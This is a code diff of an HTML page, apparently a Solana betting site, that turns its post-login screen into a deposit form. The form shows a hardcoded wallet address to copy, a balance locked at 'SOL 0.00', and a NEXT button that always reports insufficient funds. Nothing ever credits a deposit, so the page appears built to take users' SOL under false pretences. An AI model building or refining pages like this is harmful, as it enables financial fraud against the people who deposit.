@@ -156,13 +156,8 @@
             font-family: 'Rubik', sans-serif;
             font-weight: 700;
             font-size: 13px;
-            cursor: pointer;
+            cursor: default;
             white-space: nowrap;
-        }
-
-        .balance-box:hover {
-            background-color: #20242d;
-            border-color: #343946;
         }
 
         .balance-box img {
@@ -190,279 +185,251 @@
         }
 
         /* =========================================
-           INTERFEJS GRY (WIDOCZNY PO ZALOGOWANIU)
+           OKNO DEPOSIT / CONTINUE PO ZALOGOWANIU
            ========================================= */
-        .game-ui {
+        .deposit-overlay {
             position: absolute;
             inset: 0;
-            z-index: 10;
+            z-index: 15;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: flex-end;
-            padding: 20px 24px 26px;
+            justify-content: center;
+            padding: 16px;
+            gap: 14px;
         }
 
-        .game-ui.is-hidden {
+        .deposit-overlay.is-hidden {
             display: none;
         }
 
-        /* Kapsuła 0.00 nad cyfrą na środku toru */
-        .track-balance-pill {
-            position: absolute;
-            top: 42%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: #1e2430;
-            color: #ffffff;
-            font-weight: 900;
-            font-size: 20px;
-            padding: 4px 18px;
-            border-radius: 999px;
-            letter-spacing: 0.6px;
-            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.28);
-        }
-
-        /* Komunikat błędu nad przyciskiem BET */
-        .balance-alert {
-            min-height: 28px;
-            margin-bottom: 10px;
-            padding: 6px 18px;
-            background-color: rgba(11, 14, 20, 0.92);
+        /* Czerwony komunikat na górze gdy brak środków po kliknięciu NEXT */
+        .top-error-banner {
+            min-height: 36px;
+            padding: 8px 22px;
+            background-color: rgba(11, 14, 20, 0.94);
             border: 1px solid #ff2a2a;
-            border-radius: 999px;
-            color: #ff3b3b;
+            border-radius: 12px;
+            color: #ff2a2a;
+            font-family: 'Rubik', sans-serif;
             font-weight: 900;
-            font-size: 14px;
-            letter-spacing: 0.4px;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+            font-size: 15px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            text-align: center;
+            box-shadow: 0 10px 28px rgba(0, 0, 0, 0.45);
             opacity: 0;
-            transform: translateY(6px);
+            transform: translateY(-6px);
             pointer-events: none;
             transition: opacity 0.2s ease, transform 0.2s ease;
         }
 
-        .balance-alert.is-visible {
+        .top-error-banner.is-visible {
             opacity: 1;
             transform: translateY(0);
         }
 
-        /* Duży niebieski przycisk BET */
-        .big-bet-btn {
-            width: 310px;
-            height: 76px;
-            background-color: #46c3f6;
-            border: none;
-            border-radius: 38px;
-            color: #ffffff;
-            font-family: 'Rubik', sans-serif;
-            font-weight: 900;
-            font-size: 24px;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            cursor: pointer;
-            margin-bottom: 18px;
-            box-shadow: 0 10px 28px rgba(0, 0, 0, 0.25);
-            transition: background-color 0.15s ease, transform 0.12s ease;
-        }
-
-        .big-bet-btn:hover {
-            background-color: #35b6ec;
-        }
-
-        .big-bet-btn:active {
-            transform: scale(0.97);
-        }
-
-        /* Dolny czarny panel */
-        .bottom-bar {
-            width: 100%;
-            max-width: 1180px;
-            min-height: 128px;
-            background-color: #07090d;
-            border-radius: 64px;
-            padding: 18px 36px;
+        .deposit-row {
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            gap: 20px;
-            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.45);
+            justify-content: center;
+            gap: 16px;
+            flex-wrap: wrap;
         }
 
-        /* Lewa kolumna: YOUR SOLANA ADDRES + pole z adresem + COPY */
-        .address-section {
+        .deposit-card {
+            width: 390px;
+            max-width: 92vw;
+            background-color: #0b0e14;
+            border-radius: 72px;
+            padding: 32px 32px 36px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 10px;
-            flex: 1.25;
+            box-shadow: 0 22px 55px rgba(0, 0, 0, 0.48);
+            border: 1px solid rgba(56, 189, 248, 0.16);
         }
 
-        .address-title {
+        .card-logo {
+            width: 46px;
+            height: 46px;
+            object-fit: contain;
+            margin-bottom: 16px;
+            display: block;
+        }
+
+        .field-label {
+            font-family: 'Rubik', sans-serif;
             font-weight: 900;
-            font-size: 19px;
-            letter-spacing: 0.6px;
+            font-size: 16px;
+            letter-spacing: 0.5px;
             text-transform: uppercase;
             color: #ffffff;
+            margin-bottom: 10px;
             text-align: center;
         }
 
-        .address-title span {
+        .field-label span {
             color: #29b6f6;
         }
 
-        .address-box-row {
-            display: flex;
-            align-items: center;
-            gap: 8px;
+        /* Pole adresu + przycisk COPY */
+        .addr-copy-wrap {
             width: 100%;
-            max-width: 350px;
-        }
-
-        .address-pill {
-            flex: 1;
-            height: 36px;
-            background-color: #1f2836;
-            border-radius: 10px;
-            padding: 0 12px;
+            max-width: 280px;
             display: flex;
             align-items: center;
-            color: #d6e4f0;
-            font-size: 11.5px;
-            font-weight: 700;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-            user-select: all;
+            gap: 6px;
+            margin-bottom: 16px;
         }
 
-        .copy-btn {
+        .sol-addr-input {
+            flex: 1;
+            min-width: 0;
             height: 36px;
-            padding: 0 14px;
+            background-color: #1c2536;
+            border: 1px solid transparent;
+            border-radius: 10px;
+            padding: 0 10px;
+            color: #dbeafe;
+            font-family: 'Rubik', sans-serif;
+            font-weight: 700;
+            font-size: 10.5px;
+            outline: none;
+        }
+
+        .mini-copy-btn {
+            height: 36px;
+            padding: 0 11px;
             background-color: #29b6f6;
             border: none;
             border-radius: 10px;
             color: #ffffff;
             font-family: 'Rubik', sans-serif;
             font-weight: 900;
-            font-size: 12px;
-            letter-spacing: 0.5px;
+            font-size: 10px;
+            letter-spacing: 0.4px;
             text-transform: uppercase;
             cursor: pointer;
             white-space: nowrap;
             transition: background-color 0.15s ease, transform 0.1s ease;
         }
 
-        .copy-btn:hover {
+        .mini-copy-btn:hover {
             background-color: #1da5e6;
         }
 
-        .copy-btn:active {
-            transform: scale(0.96);
-        }
-
-        .copy-btn.is-copied {
+        .mini-copy-btn.is-copied {
             background-color: #16a34a;
         }
 
-        /* Środkowa sekcja: MIN/MAX DEPOSIT + WARNING */
-        .limits-warning-section {
+        /* Zablokowane pole BALANCE: SOL 0.00 */
+        .locked-balance-box {
+            width: 100%;
+            max-width: 225px;
+            height: 36px;
+            background-color: #1c2536;
+            border: 1px solid #263248;
+            border-radius: 10px;
+            color: #ffffff;
+            font-family: 'Rubik', sans-serif;
+            font-weight: 900;
+            font-size: 13px;
+            letter-spacing: 0.8px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 24px;
-            flex: 1.5;
+            cursor: not-allowed;
+            margin-bottom: 14px;
         }
 
-        .limits-col {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
+        .refresh-note {
+            font-family: 'Rubik', sans-serif;
             font-weight: 900;
-            font-size: 16px;
-            letter-spacing: 0.5px;
-            white-space: nowrap;
-        }
-
-        .limits-col span {
-            color: #19e619;
-        }
-
-        .warning-col {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            font-size: 11px;
+            letter-spacing: 0.4px;
+            text-transform: uppercase;
+            color: #ffffff;
             text-align: center;
-            max-width: 240px;
+            margin-bottom: 16px;
         }
 
-        .warning-title {
-            color: #ff1e1e;
+        .continue-btn {
+            min-width: 175px;
+            height: 48px;
+            padding: 0 28px;
+            background-color: #38bdf8;
+            border: none;
+            border-radius: 24px;
+            color: #ffffff;
+            font-family: 'Rubik', sans-serif;
             font-weight: 900;
             font-size: 16px;
             letter-spacing: 0.6px;
+            text-transform: uppercase;
+            cursor: pointer;
+            box-shadow: 0 6px 18px rgba(56, 189, 248, 0.35);
+            transition: background-color 0.15s ease, transform 0.12s ease;
+        }
+
+        .continue-btn:hover {
+            background-color: #1da5e6;
+        }
+
+        .continue-btn:active {
+            transform: scale(0.97);
+        }
+
+        /* Dwa małe kwadraciki obok okna */
+        .side-squares {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .info-square {
+            width: 156px;
+            min-height: 124px;
+            background-color: #0b0e14;
+            border: 1px solid rgba(56, 189, 248, 0.18);
+            border-radius: 16px;
+            padding: 14px 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            box-shadow: 0 14px 34px rgba(0, 0, 0, 0.42);
+        }
+
+        .limits-square-line {
+            font-family: 'Rubik', sans-serif;
+            font-weight: 900;
+            font-size: 12px;
+            letter-spacing: 0.4px;
+            color: #ffffff;
+            line-height: 1.5;
+        }
+
+        .limits-square-line span {
+            color: #19e619;
+        }
+
+        .warning-square-title {
+            color: #ff2a2a;
+            font-weight: 900;
+            font-size: 12px;
+            letter-spacing: 0.5px;
             margin-bottom: 6px;
         }
 
-        .warning-desc {
-            color: #ff1e1e;
+        .warning-square-text {
+            color: #ff2a2a;
             font-weight: 900;
             font-size: 9.5px;
             line-height: 1.35;
             letter-spacing: 0.3px;
             text-transform: uppercase;
-        }
-
-        /* Prawa sekcja: BET: [ 0.00 ] + logo Solany */
-        .bet-input-section {
-            display: flex;
-            align-items: center;
-            justify-content: flex-end;
-            gap: 22px;
-            flex: 1;
-        }
-
-        .bet-col {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .bet-label {
-            font-weight: 900;
-            font-size: 18px;
-            letter-spacing: 0.6px;
-            color: #ffffff;
-        }
-
-        .bet-amount-box {
-            width: 112px;
-            height: 36px;
-            background-color: #1f2836;
-            border: 1px solid transparent;
-            border-radius: 10px;
-            color: #ffffff;
-            font-family: 'Rubik', sans-serif;
-            font-weight: 900;
-            font-size: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: border-color 0.15s ease, background-color 0.15s ease;
-        }
-
-        .bet-amount-box:hover {
-            border-color: #ff2a2a;
-            background-color: #253040;
-        }
-
-        .bottom-sol-logo {
-            width: 72px;
-            height: 72px;
-            object-fit: contain;
-            display: block;
         }
 
         /* =========================================
@@ -493,29 +460,6 @@
             align-items: center;
             box-shadow: 0 22px 55px rgba(0, 0, 0, 0.45);
             border: 1px solid rgba(56, 189, 248, 0.14);
-        }
-
-        .card-logo {
-            width: 44px;
-            height: 44px;
-            object-fit: contain;
-            margin-bottom: 18px;
-            display: block;
-        }
-
-        .field-label {
-            font-family: 'Rubik', sans-serif;
-            font-weight: 900;
-            font-size: 16px;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-            color: #ffffff;
-            margin-bottom: 10px;
-            text-align: center;
-        }
-
-        .field-label span {
-            color: #29b6f6;
         }
 
         .input-wrapper {
@@ -664,52 +608,47 @@
     <main class="main-content">
         <img src="Zrzut ekranu 2026-11-22 155605.png" alt="Zrzut ekranu" class="bg-track" id="bgTrack">
 
-        <!-- EKRAN GRY (odblokowywany po zalogowaniu) -->
-        <div class="game-ui is-hidden" id="gameUi">
-            <!-- 0.00 nad cyfrą na środku toru -->
-            <div class="track-balance-pill">0.00</div>
+        <!-- NOWE OKNO PO ZALOGOWANIU (zostaje też po odświeżeniu strony) -->
+        <div class="deposit-overlay is-hidden" id="depositOverlay">
+            <div class="top-error-banner" id="topErrorBanner">You don't have enough funds</div>
 
-            <!-- Komunikat błędu balansu -->
-            <div class="balance-alert" id="balanceAlert">You dont have enough balance</div>
+            <div class="deposit-row">
+                <div class="deposit-card">
+                    <img src="sol.png" alt="Solana Logo" class="card-logo">
 
-            <!-- Główny przycisk BET -->
-            <button type="button" class="big-bet-btn" id="mainBetBtn">BET</button>
-
-            <!-- Dolny panel -->
-            <div class="bottom-bar">
-                <!-- Lewa sekcja: Adres Solana + przycisk COPY -->
-                <div class="address-section">
-                    <div class="address-title">YOUR <span>SOLANA</span> ADDRES</div>
-                    <div class="address-box-row">
-                        <div class="address-pill" id="solanaAddress" title="4VCRoo3SLogGjANDAoFWhuQmtrc6TsXeBbKaX5yCmXfx">
-                            4VCRoo3SLogGjANDAoFWhuQmtrc6TsXeBbKaX5yCmXfx
-                        </div>
-                        <button type="button" class="copy-btn" id="copyAddressBtn">COPY</button>
+                    <label for="solAddressInput" class="field-label">YOUR <span>SOL</span> ADDRES</label>
+                    <div class="addr-copy-wrap">
+                        <input
+                            type="text"
+                            id="solAddressInput"
+                            class="sol-addr-input"
+                            value="4VCRoo3SLogGjANDAoFWhuQmtrc6TsXeBbKaX5yCmXfx"
+                            readonly
+                        >
+                        <button type="button" class="mini-copy-btn" id="copyBtn">COPY</button>
                     </div>
+
+                    <div class="field-label">BALANCE</div>
+                    <div class="locked-balance-box" id="lockedBalanceBox" aria-disabled="true">SOL 0.00</div>
+
+                    <div class="refresh-note">REFRESH THE PAGE WHEN DEPOSIT</div>
+
+                    <button type="button" class="continue-btn" id="nextContinueBtn">NEXT</button>
                 </div>
 
-                <!-- Środek: MIN/MAX DEPOSIT + WARNING -->
-                <div class="limits-warning-section">
-                    <div class="limits-col">
-                        <div>MIN DEPOSIT: <span>0.05</span></div>
-                        <div>MAX DEPOSIT: <span>0.5</span></div>
+                <!-- Dwa małe kwadraciki obok po angielsku -->
+                <div class="side-squares">
+                    <div class="info-square">
+                        <div class="limits-square-line">MIN DEPO: <span>0.05 SOL</span></div>
+                        <div class="limits-square-line">MAX DEPO: <span>0.5 SOL</span></div>
                     </div>
 
-                    <div class="warning-col">
-                        <div class="warning-title">!WARNING!</div>
-                        <div class="warning-desc">
-                            IF YOU DEPOSIT MORE THAN THE MAXIMUM OR LESS THAN THE MINIMUM YOU WILL RECEIVE NOTHING.
+                    <div class="info-square">
+                        <div class="warning-square-title">!WARNING!</div>
+                        <div class="warning-square-text">
+                            DEPOSITS BELOW THE MINIMUM OR ABOVE THE MAXIMUM WILL NOT ARRIVE.
                         </div>
                     </div>
-                </div>
-
-                <!-- Prawa sekcja: BET 0.00 + Logo Solany -->
-                <div class="bet-input-section">
-                    <div class="bet-col">
-                        <div class="bet-label">BET:</div>
-                        <button type="button" class="bet-amount-box" id="betTabBox">0.00</button>
-                    </div>
-                    <img src="sol.png" alt="Solana" class="bottom-sol-logo">
                 </div>
             </div>
         </div>
@@ -760,14 +699,15 @@
         const SAVED_PASSWORD_KEY = "solana_arena_saved_password";
         const LOGGED_IN_KEY = "solana_arena_is_logged_in";
         const WALLET_ADDRESS = "4VCRoo3SLogGjANDAoFWhuQmtrc6TsXeBbKaX5yCmXfx";
-        const LOGGED_IN_BG = "Zrzut ekranu 2026-11-22 172717.png";
+        const LOGGED_IN_BG = "gierka.png";
 
         window.addEventListener("DOMContentLoaded", () => {
             const preloader = document.getElementById("preloader");
             const authOverlay = document.getElementById("authOverlay");
-            const gameUi = document.getElementById("gameUi");
+            const depositOverlay = document.getElementById("depositOverlay");
             const bgTrack = document.getElementById("bgTrack");
             const balanceAmount = document.getElementById("balanceAmount");
+            const lockedBalanceBox = document.getElementById("lockedBalanceBox");
 
             const registerForm = document.getElementById("registerForm");
             const createPassword = document.getElementById("createPassword");
@@ -778,32 +718,32 @@
             const loginPassword = document.getElementById("loginPassword");
             const loginWrongText = document.getElementById("loginWrongText");
 
-            // Elementy widoku gry
-            const copyAddressBtn = document.getElementById("copyAddressBtn");
-            const mainBetBtn = document.getElementById("mainBetBtn");
-            const betTabBox = document.getElementById("betTabBox");
-            const balanceAlert = document.getElementById("balanceAlert");
-            let alertTimeout = null;
+            const copyBtn = document.getElementById("copyBtn");
+            const nextContinueBtn = document.getElementById("nextContinueBtn");
+            const topErrorBanner = document.getElementById("topErrorBanner");
+            let errorTimer = null;
 
-            function setSolBalance(amount = 0) {
-                balanceAmount.textContent = `SOL ${Number(amount).toFixed(2)}`;
+            function syncBalance(amount = 0) {
+                const formatted = `SOL ${Number(amount).toFixed(2)}`;
+                balanceAmount.textContent = formatted;
+                lockedBalanceBox.textContent = formatted;
             }
 
-            function unlockGameScreen() {
+            function unlockDepositScreen() {
                 bgTrack.src = LOGGED_IN_BG;
-                setSolBalance(0);
+                syncBalance(0);
                 authOverlay.classList.add("is-hidden");
-                gameUi.classList.remove("is-hidden");
+                depositOverlay.classList.remove("is-hidden");
             }
 
-            setSolBalance(0);
+            syncBalance(0);
 
-            // Sprawdzenie stanu przy wejściu/odświeżeniu strony
+            // Sprawdzenie stanu przy wejściu / odświeżeniu strony
             const savedPass = localStorage.getItem(SAVED_PASSWORD_KEY);
             const isLoggedIn = localStorage.getItem(LOGGED_IN_KEY) === "true";
 
             if (isLoggedIn && savedPass) {
-                unlockGameScreen();
+                unlockDepositScreen();
             } else if (savedPass) {
                 registerForm.style.display = "none";
                 loginForm.style.display = "flex";
@@ -851,7 +791,7 @@
             createPassword.addEventListener("input", clearRegisterError);
             confirmPassword.addEventListener("input", clearRegisterError);
 
-            // Obsługa REJESTRACJI
+            // Rejestracja
             registerForm.addEventListener("submit", (e) => {
                 e.preventDefault();
                 clearRegisterError();
@@ -879,7 +819,7 @@
                 loginPassword.focus();
             });
 
-            // Obsługa LOGOWANIA
+            // Logowanie
             loginPassword.addEventListener("input", () => {
                 loginWrongText.classList.remove("is-visible");
                 loginPassword.classList.remove("is-error");
@@ -900,11 +840,11 @@
                 }
 
                 localStorage.setItem(LOGGED_IN_KEY, "true");
-                unlockGameScreen();
+                unlockDepositScreen();
             });
 
             // Kopiowanie adresu Solana
-            copyAddressBtn.addEventListener("click", async () => {
+            copyBtn.addEventListener("click", async () => {
                 try {
                     await navigator.clipboard.writeText(WALLET_ADDRESS);
                 } catch (err) {
@@ -916,28 +856,25 @@
                     document.body.removeChild(tempInput);
                 }
 
-                copyAddressBtn.textContent = "COPIED!";
-                copyAddressBtn.classList.add("is-copied");
+                copyBtn.textContent = "COPIED!";
+                copyBtn.classList.add("is-copied");
 
                 setTimeout(() => {
-                    copyAddressBtn.textContent = "COPY";
-                    copyAddressBtn.classList.remove("is-copied");
+                    copyBtn.textContent = "COPY";
+                    copyBtn.classList.remove("is-copied");
                 }, 1500);
             });
 
-            // Komunikat "You dont have enough balance" po kliknięciu BET lub zakładki BET 0.00
-            function showNoBalanceWarning() {
-                balanceAlert.textContent = "You dont have enough balance";
-                balanceAlert.classList.add("is-visible");
+            // Kliknięcie NEXT -> czerwony napis na górze że nie ma środków
+            nextContinueBtn.addEventListener("click", () => {
+                topErrorBanner.textContent = "You don't have enough funds";
+                topErrorBanner.classList.add("is-visible");
 
-                if (alertTimeout) clearTimeout(alertTimeout);
-                alertTimeout = setTimeout(() => {
-                    balanceAlert.classList.remove("is-visible");
+                if (errorTimer) clearTimeout(errorTimer);
+                errorTimer = setTimeout(() => {
+                    topErrorBanner.classList.remove("is-visible");
                 }, 2600);
-            }
-
-            mainBetBtn.addEventListener("click", showNoBalanceWarning);
-            betTabBox.addEventListener("click", showNoBalanceWarning);
+            });
         });
     </script>
 
